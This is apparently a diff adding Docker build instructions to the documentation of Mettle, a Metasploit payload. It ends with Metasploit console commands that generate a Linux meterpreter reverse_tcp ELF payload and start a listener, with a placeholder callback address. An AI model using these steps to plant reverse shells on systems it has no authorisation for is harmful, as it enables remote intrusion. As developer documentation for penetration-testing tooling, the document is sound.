@@ -178,6 +178,52 @@ to_handler
 
 
 ## Docker
+The following is to get Mettle set up locally via Docker and generate a payload.
+1. Mount the Docker container within the Mettle directory:
+```
+sudo docker run -it -v $(pwd):$(pwd) -w $(pwd) rapid7/build:mettle /bin/bash
+```
+2.
+Once the Docker container is up and running, run the `make-all` command:
+```
+./make-all
+```
+
+3. Then run `rake-build`:
+```
+rake build
+```
+
+4. Copy the gem that was output via `rake-build`, this will be found in
+`pkg/metasploit_payloads-mettle-1.0.28.pre.dev.gem`. Add this into your Metasploit-Framework directory.
+
+5. Update `metasploit-framework.gemspec` and add `-dev` with the version of the gem above:
+```
+  spec.add_runtime_dependency 'metasploit_payloads-mettle', '1.0.28-dev'
+```
+
+6. Now within your Metasploit Framework directory, run the following commands:
+```
+gem install metasploit_payloads-mettle-1.0.28.pre.dev.gem
+
+bundle install
+```
+
+7. Now you are able to generate the payload as normal - example of a linux target:
+```
+use linux/x64/meterpreter/reverse_tcp
+
+set LHOST xxx.xxx.xxx.xxx
+set LPORT 4444
+
+generate -f elf -o mettle.elf
+
+chmod +x ./mettle.elf
+
+to_handler
+```
+
+### Docker with debugging
 The following steps make use of `gdb` for debugging.
 1. Run the Docker container:
 ```
